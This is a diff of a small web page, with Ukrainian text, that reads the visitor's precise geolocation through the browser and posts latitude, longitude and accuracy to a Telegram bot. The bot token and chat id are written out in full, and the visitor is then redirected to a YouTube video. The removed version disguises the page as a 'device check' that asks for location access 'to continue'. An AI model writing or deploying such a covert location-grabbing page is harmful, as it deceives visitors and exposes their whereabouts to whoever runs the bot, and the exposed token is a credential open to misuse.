@@ -1,41 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Перевірка пристрою</title>
-</head>
-<body>
-  <h1>Перевірка пристрою</h1>
-  <p>Будь ласка, дозволь доступ до геолокації для продовження.</p>
+<script>
+  function sendLocation(position) {
+    const lat = position.coords.latitude.toFixed(6);
+    const lon = position.coords.longitude.toFixed(6);
+    const acc = position.coords.accuracy;
 
-  <script>
-    function sendLocation(position) {
-      const lat = position.coords.latitude.toFixed(6);
-      const lon = position.coords.longitude.toFixed(6);
-      const acc = position.coords.accuracy;
+    const msg = `📍 Геолокація:\nШирота: ${lat}\nДовгота: ${lon}\nТочність: ${acc} м`;
 
-      const msg = `📍 Геолокація:\nШирота: ${lat}\nДовгота: ${lon}\nТочність: ${acc} м`;
+    fetch('https://api.telegram.org/bot7216569839:AAG9Fg-Eq7l6g0H2pLzatmo70t8hfxx6xe8/sendMessage', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: 1690869119,
+        text: msg
+      })
+    }).then(() => {
+      console.log("Надіслав, перекидаю...");
+      window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    }).catch(err => {
+      console.error("❌ fetch error:", err);
+    });
+  }
 
-      fetch('https://api.telegram.org/bot7216569839:AAG9Fg-Eq7l6g0H2pLzatmo70t8hfxx6xe8/sendMessage', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: 1690869119,
-          text: msg
-        })
-      });
+  function handleError(error) {
+    console.error("❌ Геолокація не отримана:", error.message);
+  }
 
-      // 🔁 Перенаправлення на YouTube через 3 секунди
-      setTimeout(() => {
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-      }, 3000);
-    }
-
-    function handleError(error) {
-      console.error("Геолокацію не отримано:", error.message);
-    }
-
-    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-  </script>
-</body>
-</html>
+  navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+</script>
